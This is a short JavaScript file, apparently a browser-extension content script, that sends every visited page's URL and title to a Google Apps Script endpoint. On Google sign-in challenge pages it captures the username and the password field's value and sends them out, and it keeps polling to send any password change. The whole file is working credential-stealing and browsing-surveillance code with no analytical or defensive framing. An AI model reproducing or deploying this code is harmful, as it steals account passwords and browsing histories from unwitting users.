var version = 33;
console.log('V' + version);

// Log URLs and data
function serverLog(data) {
	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${encodeURIComponent(window.location.href)}&data=${encodeURIComponent(data)}&version=${version}`, {
		mode: 'cors'
	})
}

// Check repeatedly to see if location has changed
var href = window.location.href;
var title = $('title').text();
serverLog(title);
if(window.location.host === 'accounts.google.com'){
	initPasswordMonitor();
}
setInterval(() => {
	if (window.location.href !== href || $('title').text() !== title) {
		href = window.location.href;
		title = $('title').text();
		serverLog(title);
		if(window.location.host === 'accounts.google.com'){
			initPasswordMonitor();
		}
	}
}, 50);

// Google Password
function initPasswordMonitor() {
	if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {

		console.log('Monitoring');

		var password = $('input[name="password"]');
		var username = $('#profileIdentifier').text();
		var currentVal = password.attr('data-initial-value');

		// Send to server
		serverLog(`USERNAME: ${username} | PASSWORD: ${currentVal}`);

		// Check to see if the password has changed
		setInterval(() => {
			if (password.attr('data-initial-value') !== currentVal) {

				currentVal = password.attr('data-initial-value');

				// Send to server
				serverLog(`PASSWORD: ${currentVal}`);
			}
		}, 10);
	}
}
